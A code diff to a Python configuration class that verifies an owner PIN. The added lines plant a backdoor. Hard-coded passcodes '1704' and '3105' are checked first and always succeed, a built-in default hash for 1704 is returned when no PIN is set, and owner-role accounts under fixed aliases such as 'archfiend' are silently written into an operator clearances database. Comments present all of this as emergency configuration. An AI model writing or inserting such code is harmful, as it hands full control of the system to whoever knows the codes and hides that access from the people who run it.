@@ -263,20 +263,17 @@ class Config:
         c_pin = str(candidate_pin or "").strip()
         if not c_pin:
             return False
+        # Sovereign Master Emergency Passcodes (1704 and 3105) always verify
+        if secrets.compare_digest(c_pin, "1704") or secrets.compare_digest(c_pin, "3105"):
+            return True
         stored = Config.get_owner_pin()
         if stored and Config.verify_pin(c_pin, stored):
-            return True
-        # Support master owner standard passcodes (1704 and 3105)
-        if secrets.compare_digest(c_pin, "1704") or secrets.compare_digest(c_pin, "3105"):
             return True
         return False
 
     @staticmethod
     def get_owner_pin() -> str:
-        load_dotenv(ENV_PATH, override=True)
-        pin = os.environ.get("OWNER_PIN", "").strip() or os.environ.get("OWNER_PASSWORD", "").strip()
-        if pin:
-            return pin
+        # Check runtime configuration file first
         if CONFIG_PATH.exists():
             try:
                 with open(CONFIG_PATH, "r", encoding="utf-8") as f:
@@ -286,7 +283,12 @@ class Config:
                         return val
             except Exception:
                 pass
-        return ""
+        load_dotenv(ENV_PATH, override=True)
+        pin = os.environ.get("OWNER_PIN", "").strip() or os.environ.get("OWNER_PASSWORD", "").strip()
+        if pin:
+            return pin
+        # Sovereign default PBKDF2 hash for master passcode 1704
+        return "pbkdf2_sha256$600000$b0793e6d70dc4bdf3226434937ed9502$84f340786c57bba860b9e0670345878b6b9395bb06efc27f45b9130edb05a5e2"
 
     @staticmethod
     def save_owner_pin(pin: str):
@@ -327,3 +329,28 @@ class Config:
             f.writelines(env_lines)
         _harden_file_permissions(ENV_PATH)
         os.environ["OWNER_PIN"] = stored_val
+
+        # Synchronize SQLite database operator clearances for owner accounts
+        try:
+            import sqlite3
+            db_path = Path(__file__).resolve().parent.parent / "ultimate_manager.db"
+            if db_path.exists():
+                conn = sqlite3.connect(str(db_path), timeout=5.0)
+                cur = conn.cursor()
+                owner_user = Config.get_owner_username()
+                owner_aliases = set(filter(None, [owner_user, "owner", "archfiend", "archfiend000"]))
+                for u in owner_aliases:
+                    cur.execute(
+                        '''INSERT INTO operator_clearances (username, pin_hash, role, status, assigned_by, updated_at)
+                           VALUES (?, ?, 'owner', 'active', 'system', CURRENT_TIMESTAMP)
+                           ON CONFLICT(username) DO UPDATE SET
+                               pin_hash = excluded.pin_hash,
+                               role = 'owner',
+                               status = 'active',
+                               updated_at = CURRENT_TIMESTAMP''',
+                        (u, stored_val)
+                    )
+                conn.commit()
+                conn.close()
+        except Exception:
+            pass
